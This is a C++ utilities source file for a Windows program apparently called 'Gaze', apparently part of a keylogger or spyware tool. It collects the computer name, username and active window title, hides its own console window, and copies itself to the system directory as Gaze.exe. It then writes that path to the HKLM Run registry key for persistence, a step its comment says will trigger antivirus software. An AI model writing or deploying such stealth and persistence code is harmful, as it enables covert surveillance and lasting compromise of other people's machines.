#include "pch.h"
#include "Utilities.h"

/////////////////////////////////////////////////////////
// Note : In order to accept TCHAR conversion to
//        string in visual studio we must change
//        the Character Set in the project
//        properties to : Use Multy-Bite Character Set
/////////////////////////////////////////////////////////

// GetMachineName() : Return the machine name of the computer running this program
string Utilities::GetMachineName()
{
	string name;
	TCHAR buffer[INFO_BUFFER_SIZE];
	DWORD buffer_char_count = INFO_BUFFER_SIZE;

	if (!GetComputerName(buffer, &buffer_char_count))
		return "0"; // Failed to retrive machine name

	name = buffer;
	return name;
}

// GetUsername() : Return the user name of the user runnig this program
string Utilities::GetUsername()
{
	char buffer[256];
	DWORD buffer_size = 256;

	if (!GetUserName(buffer, &buffer_size))
		return "0"; // Failed to retrive username

	return buffer;
}

// GetActiveWindow() : Return the title of the current active window displayed on screen
string Utilities::GetActiveWindow()
{
	char buffer[256];
	GetWindowText(GetForegroundWindow(), buffer, sizeof(buffer));

	return buffer;
}

//  GetSystemDir() : Return the path of the system directory
string Utilities::GetSystemDir()
{
	char buffer[256];
	GetSystemDirectory(buffer, sizeof(buffer));

	return buffer;
}

// GetProgramFilePath() : Return the program file path
string Utilities::GetProgramFilePath()
{
	// Get the program handle and store it module_handle
	HMODULE module_handle = GetModuleHandle(NULL);

	char buffer[256];
	GetSystemDirectory(buffer, sizeof(buffer));

	// Get the program path and file name
	GetModuleFileName(module_handle, buffer, sizeof(buffer));

	return buffer;
}

// HideConsole() : Hide the program console window
void Utilities::HideConsole()
{
	AllocConsole(); // Allocate a console to the program process
	HWND console = FindWindow("ConsoleWindowClass", NULL); // Return the console handler
	ShowWindow(console, 0); // Hide it
}

// AddToRegistry() : Add this program to the registry (Will trigger most anti-virus)
bool Utilities::AddToRegistry()
{
	// Note MAX_PATH define in minwindef.h (part of the includes in the Utilities.h)
	char program_path[MAX_PATH];
	char system_path[MAX_PATH];

	// Get the program handle and store it module_handle
	HMODULE module_handle = GetModuleHandle(NULL);

	// Get the program path and file name
	GetModuleFileName(module_handle, program_path, sizeof(program_path));

	// Get system directory
	GetSystemDirectory(system_path, sizeof(system_path));

	// Append new file name to system_path
	strcat_s(system_path, "\\Gaze.exe");

	if (!CopyFile(program_path, system_path, false))
		return false; // if failed to copy to new location
	
	// Create key and assign it to registry 
	HKEY key;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		          0, KEY_SET_VALUE, &key);
	RegSetValueEx(key, "GAZE_REG", 0, REG_SZ, (const unsigned char*)system_path, sizeof(system_path));

	return true;
}